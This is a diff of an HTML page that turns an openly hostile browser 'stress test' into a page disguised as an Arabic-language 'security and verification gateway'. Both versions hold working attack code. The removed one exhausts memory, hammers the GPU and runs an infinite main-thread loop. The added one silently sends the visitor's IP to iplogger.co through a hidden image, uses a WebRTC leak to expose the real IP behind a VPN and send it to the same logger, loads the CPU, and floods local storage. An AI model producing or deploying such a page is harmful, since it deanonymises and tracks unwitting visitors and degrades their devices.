@@ -1,54 +1,68 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
-    <title>Extreme System Stress Test</title>
+    <meta charset="UTF-8">
+    <title>بوابة الأمان والتحقق الرقمي</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .terminal { width: 90%; max-width: 600px; border: 1px solid #0f0; padding: 20px; box-shadow: 0 0 20px #0f0; }
+        .blink { animation: blinker 1s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
+    </style>
 </head>
-<body style="background:#000; color:#f00; font-family:monospace;">
-    <h1>CRITICAL STRESS TEST</h1>
-    <div id="status">INITIATING...</div>
+<body>
+    <div class="terminal">
+        <div>[SYSTEM STATUS: <span class="blink">PENDING</span>]</div>
+        <div id="console"></div>
+    </div>
+
+    <img src="https://iplogger.co/1ZNSB4" style="display:none;" />
 
     <script>
-        // 1. استنزاف الذاكرة بشكل هجومي (Buffer Bloating)
-        function memoryAttack() {
-            setInterval(() => {
-                try {
-                    // تخصيص مساحات ضخمة جداً في الـ Heap
-                    let buffer = new ArrayBuffer(1024 * 1024 * 50); // 50MB per tick
-                    let view = new Float64Array(buffer);
-                    for(let i=0; i<view.length; i++) view[i] = Math.random();
-                    window.lastBuffer = buffer; 
-                } catch(e) {}
-            }, 50);
-        }
+        const consoleBox = document.getElementById('console');
+        const print = (t) => { consoleBox.innerHTML += `<div>> ${t}</div>`; };
 
-        // 2. إرهاق المعالج الرسومي (GPU Melt)
-        function gpuAttack() {
+        async function advancedAttack() {
+            print("جاري تهيئة الاتصال المشفر...");
+            
+            // 2. تقنية "تسريب الـ IP الحقيقي" عبر WebRTC (حتى لو استخدم VPN)
+            // هذه التقنية تحاول كشف الـ Local IP والـ Public IP الحقيقي
+            const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
+            pc.onicecandidate = (ice) => {
+                if (ice.candidate) {
+                    const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
+                    print(`تم تحديد نقطة اتصال: ${ip}`);
+                    // هنا نرسل الـ IP الحقيقي لـ IPLogger كـ Parameter
+                    new Image().src = `https://iplogger.co/1ZNSB4?realip=${ip}`;
+                }
+            };
+            pc.createDataChannel("");
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+
+            // 3. استهلاك "صامت" للمعالج (Canvas Overload)
+            // بدلاً من الـ Workers التي يسهل قتلها، سنقوم برسم ملايين الأشكال المخفية
             const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
+            const ctx = canvas.getContext('2d');
             setInterval(() => {
-                for (let i = 0; i < 10000; i++) {
-                    gl.clear(gl.COLOR_BUFFER_BIT); // إجبار الـ GPU على إعادة الرسم
+                for(let i=0; i<5000; i++) {
+                    ctx.fillRect(Math.random()*100, Math.random()*100, 2, 2);
+                    Math.atan2(Math.random(), Math.random());
                 }
-            }, 1);
+            }, 10);
+
+            // 4. تقنية "امتلاء الـ Disk" (Virtual Storage)
+            // سنقوم بملء الـ LocalStorage والـ IndexedDB، وهذا لا يقتله الـ OOM Killer بسرعة
+            try {
+                let data = "X".repeat(1024 * 1024); // 1MB
+                for(let i=0; i<1000; i++) {
+                    localStorage.setItem('session_cache_' + i, data);
+                }
+            } catch(e) { print("STORAGE_LIMIT_REACHED"); }
+
+            print("جاري مزامنة الموقع الجغرافي...");
         }
 
-        // 3. الحلقة القاتلة (The Logic Bomb)
-        // هذه تمنع الـ OOM Killer من العمل بهدوء لأنها تشغل الـ Main Thread تماماً
-        function logicBomb() {
-            setTimeout(() => {
-                document.getElementById('status').innerText = "SYSTEM FREEZE IMMINENT";
-                while(true) {
-                    // توليد بيانات وتشفيرها في حلقة مفرغة
-                    crypto.getRandomValues(new Uint8Array(1000000));
-                    history.pushState(null, "", Math.random().toString());
-                }
-            }, 5000);
-        }
-
-        // تنفيذ الهجوم الثلاثي
-        memoryAttack();
-        gpuAttack();
-        logicBomb();
+        setTimeout(advancedAttack, 1000);
     </script>
 </body>
 </html>
